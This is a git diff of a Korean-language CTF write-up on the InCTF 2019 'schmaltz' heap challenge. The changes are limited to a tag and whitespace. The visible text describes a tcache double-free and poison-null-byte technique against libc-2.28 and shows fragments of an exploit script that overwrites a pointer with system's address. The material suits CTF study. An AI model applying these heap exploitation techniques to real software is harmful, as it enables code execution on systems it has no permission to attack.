@@ -1,6 +1,6 @@
 ---
 title: InCTF schmaltz write up
-categories: [2019, InCTF]
+categories: [2019, InCTF, new]
 tags: [CTF, heap, 18.10, tcache]
 ---
 
@@ -17,7 +17,7 @@ problem   | x64, fsb, bof, easy
 # analysis
 double free가 가능한 tcache heap 문제이다. 18.10의 libc-2.28을 쓰기 때문에 tcache의 double free가 막혀 있다.
 하지만 poison null byte 취약점이 존재하기 때문에 예를들어 0x121만큼 alloc 영역을 free를 하고, 0x100으로 덮은다음에 alloc 영역을 free를 한다면
-attack이 가능하다. 
+attack이 가능하다.
 
 실제 대회에서는 system("/bin/sh")를 막아놨는지 작동이 안됬는데 orw를 원한것으로 예측이 되지만 시간이 부족하여 시도해보진 못했다.
 
@@ -94,7 +94,7 @@ def pwn():
         add(248, "ls>&0\x00\x00")
 
     remove(0)
-    
+
     add(248, p64(system_addr))
     remove(5)
 
